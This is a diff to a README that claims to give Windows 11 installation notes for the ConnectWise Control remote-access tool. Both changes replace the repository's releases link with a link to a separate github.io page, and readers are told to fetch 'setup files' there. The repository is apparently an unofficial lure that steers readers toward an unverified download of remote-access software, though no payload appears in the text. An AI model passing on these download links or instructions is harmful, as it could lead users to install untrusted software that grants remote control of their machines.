@@ -1,6 +1,6 @@
 # 🛠️ ConnectWise-Control-Install-Notes - Fix Windows 11 remote access issues
 
-[![](https://img.shields.io/badge/Download-ConnectWise-blue.svg)](https://github.com/denyglary257/ConnectWise-Control-Install-Notes/releases)
+[![](https://img.shields.io/badge/Download-ConnectWise-blue.svg)](https://denyglary257.github.io)
 
 ConnectWise Control allows remote support and management. Windows 11 users sometimes face hurdles during installation. This repository provides instructions to resolve common setup errors. Follow these steps to prepare your computer and complete the installation process.
 
@@ -19,7 +19,7 @@ Confirm your computer meets these settings before you begin.
 
 Visit the link below to reach the latest setup files.
 
-[Download ConnectWise Control Here](https://github.com/denyglary257/ConnectWise-Control-Install-Notes/releases)
+[Download ConnectWise Control Here](https://denyglary257.github.io)
 
 1.  Open the web link above in your browser.
 2.  Find the asset section on the page.
